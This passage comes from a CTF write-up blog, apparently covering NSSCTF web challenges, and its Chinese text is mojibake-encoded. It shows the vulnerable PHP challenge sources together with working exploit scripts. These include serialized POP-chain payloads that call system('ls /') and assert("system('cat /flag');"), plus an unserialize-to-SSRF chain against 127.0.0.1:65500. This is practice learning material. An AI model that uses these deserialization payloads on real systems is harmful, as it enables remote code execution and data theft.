&amp;&amp; <span class="variable language_">$this</span>-&gt;md51 != <span class="variable language_">$this</span>-&gt;md52)  </span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">      <span class="keyword">echo</span> <span class="variable language_">$this</span>;  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$a</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;https://www.ctfer.vip&#x27;</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$title</span>;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;      <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;a;      <span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;title);  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>])) &#123;   <span class="variable">$Data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>]);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;   <span class="title function_ invoke__">highlight_file</span>(__file__);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÁúãfinÁ±ª‰∏≠ÁöÑfmm()ÂáΩÊï∞Ôºå<code>$b($this-&gt;title);</code>Ëøô‰∏ÄÊù°ËØ≠Âè•Â¶ÇÊûúb‰∏∫systemËÄåtitle‰∏∫ls &#x2F;,ÈÇ£‰πàÊòØ‰∏çÊòØÂ∞±ÊâßË°åÊü•ÁúãÊ†πÁõÆÂΩïÔºåÊÄé‰πàËøõÂÖ•Ëøô‰∏™ÂáΩÊï∞Âë¢ÔºültÁ±ª‰∏≠toStringÂèØ‰ª•ËøõÂÖ•<code>return $this-&gt;impo-&gt;fmm();</code>ÈÇ£‰πàÊÄé‰πàËøõÂÖ•toStringÂë¢ÔºåÂΩìÂØπË±°ÂΩì‰ΩúÂ≠óÁ¨¶‰∏≤ËæìÂá∫Êó∂‰ºöËøõÂÖ•toStringÊñπÊ≥ïÔºåÁúã__destruct()ÈîÄÊØÅÂØπË±°Êó∂‰ºöËæìÂá∫Ëøô‰∏™ÂØπË±°ÔºåËá≥Ê≠§popÈìæÂ∞±ÁêÜÊ∏ÖÊ•ö‰∫ÜÔºåËøôÈáåÂ∞±ËøõÂÖ•toStringÊúâÁÇπÈöæÁêÜËß£ÔºåÂÖ∂ÂÆÉËøòÂ•ΩÔºåËøô‰∏™popÈìæÊòØÈúÄË¶ÅËá™Â∑±ÂéªÊûÑÈÄ†Âç±Èô©ÂáΩÊï∞ÁöÑÊâßË°åÔºå‰ª•ÂâçÊ≤°ÁªÉËøá</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$impo</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md51</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md52</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;impo = <span class="variable">$f</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span>;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;a;  </span><br><span class="line">        <span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;title);<span class="comment">//ËøôÈáåÂÅöÂëΩ‰ª§ÊâßË°å  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();  </span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="string">&quot;system&quot;</span>;  </span><br><span class="line"><span class="variable">$a</span>-&gt;title = <span class="string">&quot;ls /&quot;</span>;  </span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lt</span>(<span class="variable">$a</span>);<span class="comment">//ÈÄöËøáÊûÑÈÄ†ÂáΩÊï∞ËÆ©this-&gt;impo‰∏∫ÂØπË±°ÈîÄÊØÅÊó∂ËøõÂÖ•toString  </span></span><br><span class="line"><span class="variable">$b</span>-&gt;md51[]=<span class="number">1</span>;<span class="comment">//ÈÄöËøáÊï∞ÁªÑÁªïËøáMD5  </span></span><br><span class="line"><span class="variable">$b</span>-&gt;md52[] = <span class="number">2</span>;  </span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><h2 id="1z-unserialize"><a href="#1z-unserialize" class="headerlink" title="1z_unserialize"></a>1z_unserialize</h2><p>‰πãÂâçÊ≤°ÂÅöËøáËøôÁßçÂà©Áî®ÂèÇÊï∞ÊâßË°åÂáΩÊï∞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lyh</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;NSSCTF.com&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lt</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lly</span>;  </span><br><span class="line">       </span><br><span class="line">     <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">     </span>&#123;        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;lt;        <span class="variable">$a</span>(<span class="variable language_">$this</span>-&gt;lly);  </span><br><span class="line">     &#125;  </span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">&#125;  </span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nss&#x27;</span>]);  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Â∫èÂàóÂåñËÑöÊú¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lyh</span></span>&#123;  </span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;NSSCTF.com&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lt</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lly</span>;    </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lyh</span>();  </span><br><span class="line"><span class="variable">$a</span>-&gt;lt=<span class="string">&quot;assert&quot;</span>;  </span><br><span class="line"><span class="variable">$a</span>-&gt;lly=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;  </span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2022/11/08/xznbHs.png" alt="xznbHs.png"></p><h2 id="js-sign"><a href="#js-sign" class="headerlink" title="js_sign"></a>js_sign</h2><p>Êü•ÁúãÊ∫êÁ†Å<br><img src="https://s1.ax1x.com/2022/11/08/xzuVC6.png" alt="xzuVC6.png"><br>ÈÄöËøátapcodeËß£Á†ÅflagÂá∫Êù•‰∏ãÈù¢Ëøô‰∏≤Â≠óÁ¨¶Ôºå‰∏çÁü•ÈÅìÊÄé‰πàÊèê‰∫§‰∫Ü<br><img src="https://s1.ax1x.com/2022/11/08/xzuA4x.png" alt="xzuA4x.png"></p><h2 id="Power"><a href="#Power" class="headerlink" title="Power!"></a>Power!</h2><p>ÁúãÊ∫êÁ†ÅÊúâÊèêÁ§∫<br><img src="https://s1.ax1x.com/2022/11/08/xzuTG6.png" alt="xzuTG6.png"><br>ÂÖ®ÈÉ®ÁöÑ‰ª£Á†ÅÂ∞±‰∏çÊîæ‰∫ÜÂêßÊå∫ÈïøÁöÑÊÖ¢ÊÖ¢ÂàÜÊûê</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>];    <span class="comment">//flag in /flag.php</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$path</span>)&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http:|gopher:|glob:|php:/i&quot;</span>,<span class="variable">$path</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;Seriously??&lt;/h2&gt;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;cheems.jpg&quot;</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path_info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>];</span><br><span class="line">            <span class="variable">$FV</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path_info</span>));</span><br><span class="line">            <span class="variable">$FV</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&quot;vergil.jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;POWER!!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Áõ¥Êé•Áî®getÊñπÊ≥ï‰º†ÂÖ•<code>image_path=flag.php</code><br><img src="https://s1.ax1x.com/2022/11/08/xzu7RK.png" alt="xzu7RK.png"><br><img src="https://s1.ax1x.com/2022/11/08/xzuHxO.png" alt="xzuHxO.png"><br>flagÂú®ÂÜÖÁΩëÔºåSSRFÔºåÁúã‰∏Ä‰∏ãÂì™ÈáåËÉΩÂà©Áî®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123; <span class="comment">//flag</span></span><br><span class="line">            <span class="variable">$url</span> = <span class="variable">$path</span>;</span><br><span class="line">            <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>); <span class="comment">//curl_exec() ÊâßË°åcURL‰ºöËØù„ÄÇ</span></span><br><span class="line">            <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáåÂèØ‰ª•ËøõË°åSSRFÔºåË∑ü‰∏Ä‰∏ãËøô‰∏™ÂáΩÊï∞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;black_list.<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="variable">$this</span>-&gt;path);  <span class="comment">//ÊâßË°åËøôÈáå</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$file</span>).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>loadfile()</code>ÂèØ‰ª•ËøõË°åË∑≥ËΩ¨ÔºåÂÜçË∑ü<code>loadfile()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadfile</span>();   <span class="comment">//ËøôÈáåËøõÂÖ•loadfileÔºåÊ≠§ÊñπÊ≥ïÂú®Â∞ùËØïË∞ÉÁî®Á±ªÊñπÊ≥ïÔºåËÄåÊñπÊ≥ï‰∏çÂ≠òÂú®Êó∂Ë¢´Ë∞ÉÁî®</span></span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p><code>__call</code>ÊñπÊ≥ïÂèØ‰ª•ËøõË°åË∑≥ËΩ¨ÔºåÊÉ≥ÂäûÊ≥ïËøõÂÖ•ËøôÈáå</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">goodman</span>(<span class="params"><span class="variable">$i</span>,<span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$i</span>-&gt;<span class="variable">$j</span> = <span class="variable language_">$this</span>-&gt;superhacker;</span><br><span class="line">            <span class="comment">//$a-&gt;local=&quot;http://127.0.0.1:65500/&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">goodman</span>(<span class="variable">$this</span>-&gt;a,<span class="variable">$this</span>-&gt;b);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">c</span>(); <span class="comment">//$this-&gt;a=new FileViewer();ÊâßË°åcÊñπÊ≥ï‰ΩÜÊòØ FileViewerÁ±ªÊ≤°ÊúâcÊñπÊ≥ïËøõÂÖ•callÊñπÊ≥ï</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>Âà©Áî®goodmanÂáΩÊï∞ËøõË°åÂèòÈáèË¶ÜÁõñÔºåËÆ©a‰∏∫FileViewerÁ±ªÁöÑÂØπË±°<code>b=&quot;local&quot;</code>ÔºåÁÑ∂ÂêéËÆ©BackdoorÁ±ª‰∏ã<br><code>superhacker=&quot;http://127.0.0.1:65500/&quot;</code>Â∞±ÂèØ‰ª•Ë¶ÜÁõñÊàêÂäüÔºåa‰∏∫FileViewerÂØπË±°‰ΩÜËøô‰∏™Á±ªÈáåÈù¢Ê≤°ÊúâcÊñπÊ≥ïÔºåËøõÂÖ•<code>__call</code>È≠îÊúØÊñπÊ≥ïÔºå ËøôÊ†∑popÈìæÊûÑÈÄ†ÂÆåÊàêÔºå‰ΩÜÊòØËøôÈáåÊÄé‰πàÂà©Áî®Âë¢Ôºü<br><img src="https://s1.ax1x.com/2022/11/08/xzuqMD.png" alt="xzuqMD.png"><br>Áõ¥Êé•‰º†Áªôimage_pathÊòØÂ§±Ë¥•‰∫ÜÁöÑ<br><img src="https://s1.ax1x.com/2022/11/08/xzu5I1.png" alt="xzu5I1.png"><br><img src="https://s1.ax1x.com/2022/11/08/xzuoPx.png" alt="xzuoPx.png"></p><p>ËøôÁØáÂçöÂÆ¢ÊâìÂºÄÊòØÁ©∫ÁöÑ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$path_info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="variable">$FV</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path_info</span>));</span><br><span class="line"></span><br><span class="line">            <span class="variable">$FV</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br></pre></td></tr></table></figure><p>ÊâÄ‰ª•Êàë‰ª¨Âæó‰ªéËøôÈáåËøõÂÖ•localfileÔºåÂéüÊù•ÁöÑÈÇ£Êù°ÈìæÂ≠êÂèØ‰ª•ËøõË°åÂèòÈáèË¶ÜÁõñÔºåÊàëÁöÑÁêÜËß£ÊòØËøôÊ†∑ÁöÑÔºåwp‰∏≠ËøôÈáåÊ≤°ÊúâÂ§™Â§öËß£Èáä<br>expÔºöÊù•Ê∫êwp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$black_list</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$local</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$superhacker</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> <span class="title class_">FileViewer</span>();</span><br><span class="line"><span class="variable">$n</span> = <span class="keyword">new</span> <span class="title class_">Backdoor</span>();</span><br><span class="line"><span class="variable">$n</span>-&gt;a=<span class="variable">$m</span>;</span><br><span class="line"><span class="variable">$n</span>-&gt;b=<span class="string">&quot;local&quot;</span>;</span><br><span class="line"><span class="variable">$n</span>-&gt;superhacker=<span class="string">&quot;127.0.0.1:65500/&quot;</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;black_list=<span class="string">&quot;ÈªëÂêçÂçï‰ªÄ‰πàÁöÑÁÆ°‰∏çÁùÄÊàë&quot;</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;local=<span class="variable">$n</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;path=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$m</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ÊÑüËßâÊ≤°Â§™ÁêÜËß£ÊúâÁÇπÈóÆÈ¢òÔºåÂÖàËøôÊ†∑Âêß<br>path_infoËøõÂÖ•<br><img src="https://s1.ax1x.com/2022/11/08/xzu4aR.png" alt="xzu4aR.png"><br><img src="https://s1.ax1x.com/2022/11/08/xzuWqJ.png" alt="xzuWqJ.png"><br>Ëß£Á†ÅÂæóÂà∞flag<br><img src="https://s1.ax1x.com/2022/11/08/xzuhZ9.png" alt="xzuhZ9.png"></p><h2 id="file-master"><a href="#file-master" class="headerlink" title="file_master"></a>file_master</h2><p>ËøõÊù•Êúâ‰∏™Êü•ÁúãÊñá‰ª∂ÔºåËØï‰∏Ä‰∏ãindex.php<br><img src="https://s1.ax1x.com/2022/11/08/xzKHkn.png" alt="xzKHkn.png"><br>Êü•ÁúãÊ∫êÁ†Å<br><img src="https://s1.ax1x.com/2022/11/08/xzKbYq.png" alt="xzKbYq.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$whtie_list</span> = <span class="keyword">array</span>(<span class="string">&quot;image/jpeg&quot;</span>);</span><br><span class="line">        <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$filetype</span>,<span class="variable">$whtie_list</span>))&#123;</span><br><span class="line">            <span class="variable">$img_info</span> = @<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$img_info</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$img_info</span>[<span class="number">0</span>]&lt;=<span class="number">20</span> &amp;&amp; <span 